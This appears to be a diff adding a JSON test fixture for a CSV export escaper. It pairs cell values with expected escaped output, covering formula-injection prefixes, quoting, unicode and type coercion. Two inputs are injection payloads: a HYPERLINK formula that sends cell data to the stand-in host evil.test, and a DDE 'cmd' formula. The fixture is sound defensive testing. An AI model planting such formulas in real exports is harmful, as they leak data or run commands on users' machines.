@@ -1,0 +1,139 @@
+{
+  "cells": [
+    {
+      "input": "=HYPERLINK(\"https://evil.test?x=\"&A1,\"Click\")",
+      "output": "\"'=HYPERLINK(\"\"https://evil.test?x=\"\"&A1,\"\"Click\"\")\""
+    },
+    {
+      "input": "=cmd|'/c calc'!A1",
+      "output": "'=cmd|'/c calc'!A1"
+    },
+    {
+      "input": "+1234",
+      "output": "'+1234"
+    },
+    {
+      "input": "-12",
+      "output": "'-12"
+    },
+    {
+      "input": "@SUM(A1)",
+      "output": "'@SUM(A1)"
+    },
+    {
+      "input": "\t=1+1",
+      "output": "'\t=1+1"
+    },
+    {
+      "input": "\r=1+1",
+      "output": "\"'\r=1+1\""
+    },
+    {
+      "input": "Ananya",
+      "output": "Ananya"
+    },
+    {
+      "input": "O'Brien",
+      "output": "O'Brien"
+    },
+    {
+      "input": "name, with comma",
+      "output": "\"name, with comma\""
+    },
+    {
+      "input": "has \"quotes\"",
+      "output": "\"has \"\"quotes\"\"\""
+    },
+    {
+      "input": "line\nbreak",
+      "output": "\"line\nbreak\""
+    },
+    {
+      "input": "crlf\r\nbreak",
+      "output": "\"crlf\r\nbreak\""
+    },
+    {
+      "input": "",
+      "output": ""
+    },
+    {
+      "input": " leading space",
+      "output": " leading space"
+    },
+    {
+      "input": "trailing space ",
+      "output": "trailing space "
+    },
+    {
+      "input": "नमस्ते",
+      "output": "नमस्ते"
+    },
+    {
+      "input": "😀 emoji",
+      "output": "😀 emoji"
+    },
+    {
+      "input": "919876543210",
+      "output": "919876543210"
+    },
+    {
+      "input": null,
+      "output": ""
+    },
+    {
+      "input": {
+        "undefined": true
+      },
+      "output": ""
+    },
+    {
+      "input": 0,
+      "output": "0"
+    },
+    {
+      "input": 1,
+      "output": "1"
+    },
+    {
+      "input": -1,
+      "output": "'-1"
+    },
+    {
+      "input": 1.5,
+      "output": "1.5"
+    },
+    {
+      "input": true,
+      "output": "true"
+    },
+    {
+      "input": false,
+      "output": "false"
+    },
+    {
+      "input": {
+        "date": "2026-03-15T06:00:00.000Z"
+      },
+      "output": "2026-03-15T06:00:00.000Z"
+    },
+    {
+      "input": {
+        "a": 1
+      },
+      "output": "\"{\"\"a\"\":1}\""
+    },
+    {
+      "input": [
+        1,
+        2
+      ],
+      "output": "\"[1,2]\""
+    }
+  ],
+  "document": "﻿Name,\"Note,Header\",When,Nil\r\n'=1+1,\"a,b\",2026-03-15T06:00:00.000Z,\r\nAnanya,\"has \"\"quotes\"\"\",,\r\n",
+  "fileNames": [
+    "attention-2026-03-15.csv",
+    "attention-list--2026-03-15.csv",
+    "a-bc-2026-12-31.csv"
+  ]
+}
